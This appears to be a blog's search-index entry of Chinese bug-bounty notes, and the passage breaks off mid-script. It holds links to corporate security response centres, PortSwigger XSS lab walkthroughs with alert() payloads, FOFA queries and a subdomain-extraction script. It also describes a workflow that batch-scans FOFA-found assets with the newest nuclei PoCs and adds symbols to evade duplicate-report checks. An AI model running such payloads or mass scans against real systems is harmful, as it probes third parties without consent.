<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>SRC挖掘</title>
    <url>/SRC%E6%8C%96%E6%8E%98.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/>

<table>
<thead>
<tr>
<th align="center">Name</th>
<th align="center">Link</th>
</tr>
</thead>
<tbody><tr>
<td align="center">字节跳动安全应急响应中心</td>
<td align="center"><a href="https://security.bytedance.com/submit">https://security.bytedance.com/submit</a></td>
</tr>
<tr>
<td align="center">腾讯安全应急响应中心</td>
<td align="center"><a href="https://security.tencent.com/index.php/report/add">https://security.tencent.com/index.php/report/add</a></td>
</tr>
<tr>
<td align="center">阿里安全应急响应中心</td>
<td align="center"><a href="https://security.alibaba.com/">https://security.alibaba.com/</a></td>
</tr>
<tr>
<td align="center">京东安全应急响应中心</td>
<td align="center"><a href="http://security.jd.com/">http://security.jd.com/</a></td>
</tr>
<tr>
<td align="center">百度安全应急响应中心</td>
<td align="center"><a href="http://sec.baidu.com/views/main/loophole.html#home">http://sec.baidu.com/views/main/loophole.html#home</a></td>
</tr>
<tr>
<td align="center">顺丰安全应急响应中心</td>
<td align="center"><a href="http://sfsrc.sf-express.com/submitBug">http://sfsrc.sf-express.com/submitBug</a></td>
</tr>
<tr>
<td align="center">360应急响应中心</td>
<td align="center"><a href="https://security.360.cn/Report/index">https://security.360.cn/Report/index</a></td>
</tr>
<tr>
<td align="center">哔哩哔哩安全应急响应中心</td>
<td align="center"><a href="https://security.bilibili.com/">https://security.bilibili.com/</a></td>
</tr>
<tr>
<td align="center">爱奇艺安全应急响应中心</td>
<td align="center"><a href="https://security.iqiyi.com/#submit">https://security.iqiyi.com/#submit</a></td>
</tr>
<tr>
<td align="center">蚂蚁集团安全应急响应中心</td>
<td align="center"><a href="https://security.alipay.com/sc/afsrc/home.htm">https://security.alipay.com/sc/afsrc/home.htm</a></td>
</tr>
<tr>
<td align="center">BIGO SRC</td>
<td align="center"><a href="https://security.bigo.sg/#/submittingReport">https://security.bigo.sg/#/submittingReport</a></td>
</tr>
<tr>
<td align="center">贝壳安全应急响应中心</td>
<td align="center"><a href="https://security.ke.com/vuls">https://security.ke.com/vuls</a></td>
</tr>
<tr>
<td align="center">360漏洞云众包</td>
<td align="center"><a href="https://src.360.net/home">https://src.360.net/home</a></td>
</tr>
<tr>
<td align="center">58安全应急响应中心</td>
<td align="center"><a href="https://security.58.com/">https://security.58.com/</a></td>
</tr>
<tr>
<td align="center">滴滴出行安全应急响应中心</td>
<td align="center"><a href="http://sec.didichuxing.com/">http://sec.didichuxing.com/</a></td>
</tr>
<tr>
<td align="center">东方财富安全应急响应中心</td>
<td align="center"><a href="https://passport2.eastmoney.com/pub/login?backurl=https://se//A//security.eastmoney.com/checklogin/Oj2EK64eudkAwPvb8whTTvUWqkDW87hPs3tcMijf">https://passport2.eastmoney.com/pub/login?backurl=https%3A//se//A//security.eastmoney.com/checklogin/Oj2EK64eudkAwPvb8whTTvUWqkDW87hPs3tcMijf</a></td>
</tr>
<tr>
<td align="center">斗鱼安全应急响应中心</td>
<td align="center"><a href="https://security.douyu.com/">https://security.douyu.com/</a></td>
</tr>
<tr>
<td align="center">安全应急响应中心</td>
<td align="center"><a href="https://security.duxiaoman.com/views/main/loophole.html#home">https://security.duxiaoman.com/views/main/loophole.html#home</a></td>
</tr>
<tr>
<td align="center">DHgate安全应急响应中心</td>
<td align="center"><a href="http://dhsrc.dhgate.com/user.php/login/index/callback/post-add.html">http://dhsrc.dhgate.com/user.php/login/index/callback/post-add.html</a></td>
</tr>
<tr>
<td align="center">富友安全应急响应中心</td>
<td align="center"><a href="https://fsrc.fuiou.com/">https://fsrc.fuiou.com/</a></td>
</tr>
<tr>
<td align="center">货拉拉安全应急响应中心</td>
<td align="center"><a href="https://llsrc.huolala.cn/">https://llsrc.huolala.cn/</a></td>
</tr>
<tr>
<td align="center">合合安全应急响应中心</td>
<td align="center"><a href="https://security.intsig.com/">https://security.intsig.com/</a></td>
</tr>
<tr>
<td align="center">火线安全平台</td>
<td align="center"><a href="https://www.huoxian.cn/login">https://www.huoxian.cn/login</a></td>
</tr>
<tr>
<td align="center">好未来安全应急响应中心</td>
<td align="center"><a href="http://src.100tal.com/">http://src.100tal.com/</a></td>
</tr>
<tr>
<td align="center">华为安全激励计划</td>
<td align="center"><a href="https://bugbounty.huawei.com/">https://bugbounty.huawei.com/</a></td>
</tr>
<tr>
<td align="center">焦点安全应急响应中心</td>
<td align="center"><a href="https://security.focuschina.com/home/index/report.html">https://security.focuschina.com/home/index/report.html</a></td>
</tr>
<tr>
<td align="center">竞技安全应急响应中心</td>
<td align="center"><a href="https://security.jj.cn/">https://security.jj.cn/</a></td>
</tr>
<tr>
<td align="center">快手安全应急响应中心</td>
<td align="center"><a href="https://security.kuaishou.com/#/submit">https://security.kuaishou.com/#/submit</a></td>
</tr>
<tr>
<td align="center">联想安全应急响应中心</td>
<td align="center"><a href="https://lsrc.vulbox.com/">https://lsrc.vulbox.com/</a></td>
</tr>
<tr>
<td align="center">同程旅行安全应急响应中心</td>
<td align="center"><a href="https://sec.ly.com/">https://sec.ly.com/</a></td>
</tr>
<tr>
<td align="center">美丽联合集团安全应急响应中心</td>
<td align="center"><a href="http://security.mogujie.com/#/">http://security.mogujie.com/#/</a></td>
</tr>
<tr>
<td align="center">魅族安全应急响应中心</td>
<td align="center"><a href="https://sec.meizu.com/">https://sec.meizu.com/</a></td>
</tr>
<tr>
<td align="center">陌陌安全应急响应中心</td>
<td align="center"><a href="https://security.immomo.com/">https://security.immomo.com/</a></td>
</tr>
<tr>
<td align="center">马蜂窝安全应急响应中心</td>
<td align="center"><a href="https://security.mafengwo.cn/submit">https://security.mafengwo.cn/submit</a></td>
</tr>
<tr>
<td align="center">美团安全应急响应中心</td>
<td align="center"><a href="https://security.meituan.com/">https://security.meituan.com/</a></td>
</tr>
<tr>
<td align="center">OPPO安全应急响应中心</td>
<td align="center"><a href="https://security.oppo.com/add.jsp">https://security.oppo.com/add.jsp</a></td>
</tr>
<tr>
<td align="center">网易安全中心</td>
<td align="center"><a href="http://anquan.163.com/module/hole/new-hole.html">http://anquan.163.com/module/hole/new-hole.html</a></td>
</tr>
<tr>
<td align="center">平安安全应急响应中心</td>
<td align="center"><a href="http://security.pingan.com/submit">http://security.pingan.com/submit</a></td>
</tr>
<tr>
<td align="center">去哪儿安全应急响应中心</td>
<td align="center"><a href="https://security.qunar.com/report.php">https://security.qunar.com/report.php</a></td>
</tr>
<tr>
<td align="center">融360安全应急响应中心</td>
<td align="center"><a href="https://security.rong360.com/#/leak/add">https://security.rong360.com/#/leak/add</a></td>
</tr>
<tr>
<td align="center">知道创宇安全应急响应中心</td>
<td align="center"><a href="https://www.seebug.org/">https://www.seebug.org/</a></td>
</tr>
<tr>
<td align="center">新浪安全应急响应中心</td>
<td align="center"><a href="http://sec.sina.com.cn/">http://sec.sina.com.cn/</a></td>
</tr>
<tr>
<td align="center">苏宁安全应急响应中心</td>
<td align="center"><a href="https://security.suning.com/">https://security.suning.com/</a></td>
</tr>
<tr>
<td align="center">途牛安全应急响应中心</td>
<td align="center"><a href="http://sec.tuniu.com/">http://sec.tuniu.com/</a></td>
</tr>
<tr>
<td align="center">T3出行安全应急响应中心</td>
<td align="center"><a href="https://security.t3go.cn/">https://security.t3go.cn/</a></td>
</tr>
<tr>
<td align="center">唯品会安全应急响应中心</td>
<td align="center"><a href="https://sec.vip.com/">https://sec.vip.com/</a></td>
</tr>
<tr>
<td align="center">vivo安全应急响应中心</td>
<td align="center"><a href="https://security.vivo.com.cn/#/bugsubmit">https://security.vivo.com.cn/#/bugsubmit</a></td>
</tr>
<tr>
<td align="center">挖财安全应急响应中心</td>
<td align="center"><a href="https://sec.wacai.com/">https://sec.wacai.com/</a></td>
</tr>
<tr>
<td align="center">微博安全应急响应中心</td>
<td align="center"><a href="http://wsrc.weibo.com/leak_module_view">http://wsrc.weibo.com/leak_module_view</a></td>
</tr>
<tr>
<td align="center">微众银行安全应急响应中心</td>
<td align="center"><a href="https://security.webank.com/report/add">https://security.webank.com/report/add</a></td>
</tr>
<tr>
<td align="center">完美世界安全应急响应中心</td>
<td align="center"><a href="http://security.wanmei.com/">http://security.wanmei.com/</a></td>
</tr>
<tr>
<td align="center">小米安全中心</td>
<td align="center"><a href="https://sec.xiaomi.com/submit">https://sec.xiaomi.com/submit</a></td>
</tr>
<tr>
<td align="center">小赢安全应急响应中心</td>
<td align="center"><a href="https://security.xiaoying.com/user.php?m=user&c=post&a=add">https://security.xiaoying.com/user.php?m=user&amp;c=post&amp;a=add</a></td>
</tr>
<tr>
<td align="center">喜马拉雅安全应急响应中心</td>
<td align="center"><a href="https://security.ximalaya.com/">https://security.ximalaya.com/</a></td>
</tr>
<tr>
<td align="center">携程安全应急响应中心</td>
<td align="center"><a href="https://sec.ctrip.com/report">https://sec.ctrip.com/report</a></td>
</tr>
<tr>
<td align="center">讯飞安全应急响应中心</td>
<td align="center"><a href="https://security.iflytek.com/user.php/post/add">https://security.iflytek.com/user.php/post/add</a></td>
</tr>
<tr>
<td align="center">有赞安全应急响应中心</td>
<td align="center"><a href="https://src.youzan.com/">https://src.youzan.com/</a></td>
</tr>
<tr>
<td align="center">银联安全应急响应中心</td>
<td align="center"><a href="https://security.unionpay.com/">https://security.unionpay.com/</a></td>
</tr>
<tr>
<td align="center">宜信安全应急响应中心</td>
<td align="center"><a href="https://security.creditease.cn/bugReport.html">https://security.creditease.cn/bugReport.html</a></td>
</tr>
<tr>
<td align="center">智联招聘安全应急响应中心</td>
<td align="center"><a href="https://src.zhaopin.com/#/submitvul">https://src.zhaopin.com/#/submitvul</a></td>
</tr>
<tr>
<td align="center">中通安全应急响应中心</td>
<td align="center"><a href="https://sec.zto.com/">https://sec.zto.com/</a></td>
</tr>
<tr>
<td align="center">猪八戒网安全应急响应中心</td>
<td align="center"><a href="https://sec.zbj.com/">https://sec.zbj.com/</a></td>
</tr>
<tr>
<td align="center">自如安全应急响应中心</td>
<td align="center"><a href="https://zrsecurity.ziroom.com/">https://zrsecurity.ziroom.com/</a></td>
</tr>
</tbody></table>
<h1 id="OWASP-TOP10"><a href="#OWASP-TOP10" class="headerlink" title="OWASP TOP10"></a>OWASP TOP10</h1><h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><h3 id="Reflected-XSS-into-HTML-context-with-nothing-encoded"><a href="#Reflected-XSS-into-HTML-context-with-nothing-encoded" class="headerlink" title="Reflected XSS into HTML context with nothing encoded"></a>Reflected XSS into HTML context with nothing encoded</h3><ol>
<li><p>见框就插：在输入框里面输入关键字，然后看源码中关键字出现的位置</p>
<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251125160537916.png" alt="image-20251125160537916"></p>
</li>
<li><p>尝试闭合包裹的标签：<code>&lt;/h1&gt;&lt;u&gt;yyds&lt;/u&gt;</code>。尝试闭合h1标签，并且看看能不能解析输入的标签（为啥不直接写script，因为在实战过程中，script大概率会被过滤，所以先尝试冷门标签，防止因为标签过滤导致测试失败）。</p>
<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251125161021613.png" alt="image-20251125161021613"></p>
</li>
<li><p>至此，浏览器成功解析用户输入的标签，xss漏洞呈现。构造弹框，通过BurpSuite靶场要求：<code>&lt;/h1&gt;&lt;script&gt;alert(111);&lt;/script&gt;</code></p>
</li>
</ol>
<h3 id="Stored-XSS-into-HTML-context-with-nothing-encoded"><a href="#Stored-XSS-into-HTML-context-with-nothing-encoded" class="headerlink" title="Stored XSS into HTML context with nothing encoded"></a>Stored XSS into HTML context with nothing encoded</h3><ol>
<li><p>见框就插：在输入框里面输入关键字，然后看源码中关键字出现的位置</p>
<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251125162158840.png" alt="image-20251125162158840"></p>
</li>
<li><p>尝试闭合包裹的标签：<code>&lt;/p&gt;&lt;u&gt;yyds&lt;/u&gt;</code>。尝试闭合p标签，并且看看能不能解析输入的标签（为啥不直接写script，因为在实战过程中，script大概率会被过滤，所以先尝试冷门标签，防止因为标签过滤导致测试失败）。在这里，咱们可以发现：yyds1的位置被过滤了，没有解析成标签；但是，yyds2的位置解析成功。</p>
<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251125162421502.png" alt="image-20251125162421502"></p>
</li>
<li><p>至此，浏览器成功解析用户输入的标签，xss漏洞呈现。构造弹框，通过BurpSuite靶场要求：<code>&lt;/p&gt;&lt;script&gt;alert(111);&lt;/script&gt;</code></p>
</li>
</ol>
<h3 id="DOM-XSS-in-document-write-sink-using-source-location-search"><a href="#DOM-XSS-in-document-write-sink-using-source-location-search" class="headerlink" title="DOM XSS in document.write sink using source location.search"></a>DOM XSS in document.write sink using source location.search</h3><ol>
<li><p>见框就插：在输入框里面输入关键字，然后看源码中关键字出现的位置</p>
<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251125162932730.png" alt="image-20251125162932730"></p>
</li>
<li><p>尝试闭合包裹的标签：<code>&lt;/h1&gt;&lt;u&gt;yyds&lt;/u&gt;</code>。尝试闭合h1标签，并且看看能不能解析输入的标签（为啥不直接写script，因为在实战过程中，script大概率会被过滤，所以先尝试冷门标签，防止因为标签过滤导致测试失败）。在这里，咱们可以发现：h1标签的位置被过滤了，没有解析成标签；可以尝试闭合img标签中的属性，然后再拼接onload属性触发js代码执行, <code>&quot;onload=&quot;alert(111)</code></p>
<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251125200407768.png" alt="image-20251125200407768"></p>
</li>
</ol>
<h3 id="DOM-XSS-in-jQuery-anchor-href-attribute-sink-using-location-search-source"><a href="#DOM-XSS-in-jQuery-anchor-href-attribute-sink-using-location-search-source" class="headerlink" title="DOM XSS in jQuery anchor href attribute sink using location.search source"></a>DOM XSS in jQuery anchor href attribute sink using location.search source</h3><ol>
<li><p>见框就插：在输入框里面输入关键字，然后看源码中关键字出现的位置。但是我们发现，输入的yyds并没有在当前页面中进行回显，需要在burp里面分析一下数据包。</p>
<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251125201431110.png" alt="image-20251125201431110"></p>
</li>
<li><p>通过插件HaE，以及配置的xss规则，我们发现了数据包中可能存在xss漏洞的一些代码。然后在数据包里面搜索xss的规则（没办法，插件没有具体标明匹配到了哪条规则，需要手工确认）</p>
<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251125201822160.png" alt="image-20251125201822160"></p>
</li>
<li><p>通过分析代码，我们知道脚本会从url中获取returnPath这个参数值，并且把它放到id为backLink这个标签中的href属性中，所以我们可以尝试直接写js代码，因为浏览器可以直接解析href属性中的js代码。<code>javascript:alert(&#39;XSS&#39;)</code></p>
<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251125202335789.png" alt="image-20251125202335789"></p>
</li>
</ol>
<h3 id="Reflected-XSS-into-attribute-with-angle-brackets-HTML-encoded"><a href="#Reflected-XSS-into-attribute-with-angle-brackets-HTML-encoded" class="headerlink" title="Reflected XSS into attribute with angle brackets HTML-encoded"></a>Reflected XSS into attribute with angle brackets HTML-encoded</h3><ol>
<li><p>见框就插：在输入框里面输入关键字，然后看源码中关键字出现的位置。</p>
<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251125203134544.png" alt="image-20251125203134544"></p>
</li>
<li><p>尝试闭合h1标签，但发现尖括号被过滤。尝试第二个位置——闭合属性的双引号。在input标签中，onclick属性中的js代码可以被浏览器直接解析。<code>&quot; onclick=&quot;alert(111)</code></p>
<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251125203425327.png" alt="image-20251125203425327"></p>
</li>
</ol>
<h3 id="Reflected-XSS-into-a-JavaScript-string-with-angle-brackets-HTML-encoded"><a href="#Reflected-XSS-into-a-JavaScript-string-with-angle-brackets-HTML-encoded" class="headerlink" title="Reflected XSS into a JavaScript string with angle brackets HTML encoded"></a>Reflected XSS into a JavaScript string with angle brackets HTML encoded</h3><ol>
<li><p>见框就插：在输入框里面输入关键字，然后看源码中关键字出现的位置。</p>
</li>
<li><p>前面几个经验可以知道，出现在标签里面的内容，一般都会过滤见括号，所以我们直接尝试的闭合属性中的双引号，也就是这里img标签中的src属性。<code>&quot; onload=&quot;alert(111)</code>，进一步发现，没有弹窗，查看源代码双引号被转义了，浏览器解析不了。</p>
<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251125204157721.png" alt="image-20251125204157721"></p>
</li>
<li><p>进一步分析script标签中的代码，不难发现，用户的输入被放到了js代码中，并用一个searchTerms变量进行接收，我们可以尝试逃逸出这里的单引号。但是，需要保证js语法的正确性，浏览器才会正确的执行js代码。构造payload：<code>&#39; + alert(111) + &#39;</code>，最终会变成<code>var searchTerms = &#39;&#39; + alert(111) + &#39;&#39;</code>这样一个运算表达式。而alert(111)在浏览器上会被执行，并且返回undefined，所以，最终的运算结果是searchTerms&#x3D;NaN。</p>
<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251125210401432.png" alt="image-20251125210401432"></p>
</li>
</ol>
<h3 id="Stored-XSS-into-anchor-href-attribute-with-double-quotes-HTML-encoded"><a href="#Stored-XSS-into-anchor-href-attribute-with-double-quotes-HTML-encoded" class="headerlink" title="Stored XSS into anchor href attribute with double quotes HTML-encoded"></a>Stored XSS into anchor href attribute with double quotes HTML-encoded</h3><ol>
<li><p>见框就插：在输入框里面输入关键字，然后看源码中关键字出现的位置（一共会出现在四个位置，我之前测试了一些，所显示为8个）。</p>
<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251125211832154.png" alt="image-20251125211832154"></p>
</li>
<li><p>第四个位置出现在属性里面，所以先直接对它进行测试。由于没有其他字符串拼接到payload，而是直接出现在href属性里，并且href属性中可以支持直接写js代码，所以payload：<code>javascript:alert(222)</code></p>
<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251125212229168.png" alt="image-20251125212229168"></p>
</li>
</ol>
<h3 id="DOM-XSS-in-jQuery-selector-sink-using-a-hashchange-event"><a href="#DOM-XSS-in-jQuery-selector-sink-using-a-hashchange-event" class="headerlink" title="DOM XSS in jQuery selector sink using a hashchange event"></a>DOM XSS in jQuery selector sink using a hashchange event</h3><ol>
<li><p>见框就插：在输入框里面输入关键字，然后看源码中关键字出现的位置。</p>
<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251125220214782.png" alt="image-20251125220214782"></p>
</li>
<li><p>经过测试，输入的内容会出现在两个位置，且都是p标签中，对尖括号还进行了实体化。进行不下去，查看burp数据包，发现Function关键字，可能会导致xss，进一步分析Function中的代码。我可以了解到，它会监视浏览器地址栏中#后面的内容变化，如果发生了改变，那么就会和其他内容放到jQuery的一个选择器里面，即$()。问题就出现在这个选择器上，当选择器里面出现了尖括号，jQuery就会把它视作HTML标签进行实例化。</p>
<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251125220748739.png" alt="image-20251125220748739"></p>
</li>
<li><p>所以，我们可以直接在URL地址栏中，拼接payload：<code>/#&lt;img src=x onerror=alert(1)&gt;</code></p>
<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251125221537741.png" alt="image-20251125221537741"></p>
</li>
<li><p>为什么使用&lt;script&gt;标签没有生效呢</p>
<ul>
<li>jQuery的$()选择器在实例化DOM节点的时候，方式类似于innerHTML，而这种方式动态生成的js代码在浏览器中不会立即生效，需要二次刷新才能够进行触发；</li>
<li>而img标签被实例化成DOM节点之后，js代码是通过onerror这个事件处理器进行执行的，即一旦实例化即刻生效。这种标签和属性还有很多，比如&lt;svg onload&gt;、&lt;iframe onload&gt;……</li>
</ul>
</li>
</ol>
<h3 id="DOM-AngularJS"><a href="#DOM-AngularJS" class="headerlink" title="DOM-AngularJS"></a>DOM-AngularJS</h3><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">1. AngularJs是一个前端框架，支持`&#123;&#123;&#125;&#125;`模板表达式语法；</span><br><span class="line">2. AngularJS会扫描`ng-app`元素下的内容，如果遇到了`&#123;&#123;&#125;&#125;`，就会当成模板表达式进行执行；</span><br><span class="line">3. 由于框架的安全机制限制，没有办法直接支持&lt;script&gt;标签以及js函数。经过绕过之后，payload一般为：&#123;&#123;$on.constructor(&#x27;alert(1)&#x27;)()&#125;&#125;</span><br><span class="line">4. 靶场：https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-angularjs-expression</span><br><span class="line">5. Solution：https://blog.csdn.net/m0_65361643/article/details/151396393</span><br></pre></td></tr></table></figure>

<h1 id="资产测绘"><a href="#资产测绘" class="headerlink" title="资产测绘"></a>资产测绘</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">url: fofa.icu  fofa.info</span><br><span class="line">query: country=&quot;CN&quot; &amp;&amp; (host=&quot;.com&quot; || host=&quot;.cn&quot;) &amp;&amp; </span><br></pre></td></tr></table></figure>

<h1 id="企业背调"><a href="#企业背调" class="headerlink" title="企业背调"></a>企业背调</h1><ol>
<li>企查查：<a href="https://www.qcc.com/">https://www.qcc.com/</a></li>
<li>爱企查：<a href="https://aiqicha.baidu.com/">https://aiqicha.baidu.com/</a></li>
<li>SEO权重：<a href="https://github.com/Potato-py/ipInfoSearch">https://github.com/Potato-py/ipInfoSearch</a></li>
</ol>
<h1 id="SRC平台"><a href="#SRC平台" class="headerlink" title="SRC平台"></a>SRC平台</h1><ol>
<li>权重为0：漏洞盒子-公益SRC</li>
<li>有权重：补天</li>
<li>edu.cn：教育SRC</li>
<li>大厂：专属SRC</li>
</ol>
<h1 id="快速出洞"><a href="#快速出洞" class="headerlink" title="快速出洞"></a>快速出洞</h1><h3 id="通过Nday找目标"><a href="#通过Nday找目标" class="headerlink" title="通过Nday找目标"></a>通过Nday找目标</h3><p>在nuclei poc的收集平台上<a href="https://github.com/adysec/nuclei_poc%E4%BB%A5%E6%97%B6%E9%97%B4%E9%A1%BA%E5%BA%8F%E5%80%92%E6%8E%A8%E6%89%BE%E6%9C%80%E6%96%B0%E7%9A%84poc">https://github.com/adysec/nuclei_poc以时间顺序倒推找最新的poc</a>  &#x3D;&#x3D;&gt;  然后通过FOFA匹配资产  &#x3D;&#x3D;&gt;  VPS批量漏洞+云端上传  &#x3D;&#x3D;&gt;  导出结果+ipinfoSearch批量查权重  &#x3D;&#x3D;&gt;  企查查&#x2F;爱企查做背调  &#x3D;&#x3D;&gt;  有权重交补天，没权重交盒子  &#x3D;&#x3D;&gt;  如果提示漏洞标题存在，加上一些特殊符号进行绕过。</p>
<ol>
<li>URL格式处理：<a href="http://tools.sbbbb.cn/url-ip/">URL &amp; IP 在线处理工具</a></li>
</ol>
<h2 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h2><ol>
<li>大厂边缘资产、非金融</li>
<li>漏洞处置规则</li>
</ol>
<h1 id="Day01-字节SRC"><a href="#Day01-字节SRC" class="headerlink" title="Day01-字节SRC"></a>Day01-字节SRC</h1><blockquote>
<ol>
<li>SRC不强求漏洞利用，只要是漏洞就可以。当然，能够利用造成更大的危害肯定是更好</li>
<li>SRC中常见漏洞：DOM-XSS、SSRF、逻辑漏洞、未授权访问</li>
</ol>
</blockquote>
<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><ol>
<li><p>资产扩充——多个网络空间搜索引擎联合搜索：主域名、favicon、相同证书、C段</p>
</li>
<li><p>子域名提取脚本</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlparse</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> OrderedDict</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extract_subdomains</span>(<span class="params">file_path, target_domain, include_main=<span class="literal">False</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    从文件中提取指定域名下的子域名</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    参数:</span></span><br><span class="line"><span class="string">        file_path: 包含URL的文件路径</span></span><br><span class="line"><span class="string">        target_domain: 目标主域名(如example.com)</span></span><br><span class="line"><span class="string">        include_main: 是否包含主域名本身</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">    返回:</span></span><br><span class="line"><span class="string">        去重后的子域名列表</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># 编译正则表达式，用于匹配目标域名及其子域名</span></span><br><span class="line">    <span class="comment"># 支持带端口、路径等情况</span></span><br><span class="line">    pattern = re.<span class="built_in">compile</span>(</span><br><span class="line">        <span class="string">r&#x27;(?:[a-zA-Z0-9](?:[a-zA-Z0-9\-]&#123;0,61&#125;[a-zA-Z0-9])?\.)*?&#x27;</span> + </span><br><span class="line">        re.escape(target_domain) + </span><br><span class="line">        <span class="string">r&#x27;(?::\d+)?(?:/.*)?$&#x27;</span></span><br><span class="line">    )</span><br><span class="line">    </span><br><span class="line">    subdomains = <span class="built_in">set</span>()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>, errors=<span class="string">&#x27;ignore&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">                line = line.strip()</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> line:</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                </span><br><span class="line">                <span class="comment"># 尝试使用urlparse解析</span></span><br><span class="line">                parsed = urlparse(line)</span><br><span class="line">                <span class="keyword">if</span> parsed.netloc:  <span class="comment"># 有网络位置部分</span></span><br><span class="line">                    domain = parsed.netloc</span><br><span class="line">                    <span class="comment"># 去除端口</span></span><br><span class="line">                    <span class="keyword">if</span> <span class="string">&#x27;:&#x27;</span> <span class="keyword">in</span> domain:</span><br><span class="line">                        domain = domain.split(<span class="string">&#x27;:&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="comment"># 没有协议部分，直接处理</span></span><br><span class="line">                    domain = line.split(<span class="string">&#x27;/&#x27;</span>)[<span class="number">0</span>].split(<span class="string">&#x27;:&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">                </span><br><span class="line">                <span class="comment"># 检查是否匹配目标域名</span></span><br><span class="line">                <span class="keyword">if</span> pattern.<span class="keyword">match</span>(domain):</span><br><span class="line">                    <span class="comment"># 提取完整域名(包含子域名)</span></span><br><span class="line">                    full_domain = domain</span><br><span class="line">                    </span><br><span class="line">                    <span class="comment"># 确保不包含端口信息</span></span><br><span class="line">                    <span class="keyword">if</span> <span class="string">&#x27;:&#x27;</span> <span class="keyword">in</span> full_domain:</span><br><span class="line">                        full_domain = full_domain.split(<span class="string">&#x27;:&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">                    </span><br><span class="line">                    <span class="comment"># 检查是否为主域名本身</span></span><br><span class="line">                    <span class="keyword">if</span> full_domain == target_domain:</span><br><span class="line">                        <span class="keyword">if</span> include_main:</span><br><span class="line">                            subdomains.add(full_domain)</span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        <span class="comment"># 确认是目标域名的子域名</span></span><br><span class="line">                        <span class="keyword">if</span> full_domain.endswith(<span class="string">&#x27;.&#x27;</span> + target_domain):</span><br><span class="line">                            subdomains.add(full_domain)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">except</span> FileNotFoundError:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;错误: 文件 &#x27;<span class="subst">&#123;file_path&#125;</span>&#x27; 不存在&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> []</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;处理文件时出错: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> []</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 按长度排序，便于阅读</span></span><br><span class="line">    sorted_subdomains = <span class="built_in">sorted</span>(subdomains, key=<span class="keyword">lambda</span> x: (<span class="built_in">len</span>(x.split(<span class="string">&#x27;.&#x27;</span>)), x))</span><br><span class="line">    <span class="keyword">return</span> sorted_subdomains</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">&#x27;提取指定域名下的子域名&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;file&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;包含URL的文件路径&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;domain&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;目标主域名(如example.com)&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-i&#x27;</span>, <span class="string">&#x27;--include-main&#x27;</span>, action=<span class="string">&#x27;store_true&#x27;</span>, </span><br><span class="line">                      <span class="built_in">help</span>=<span 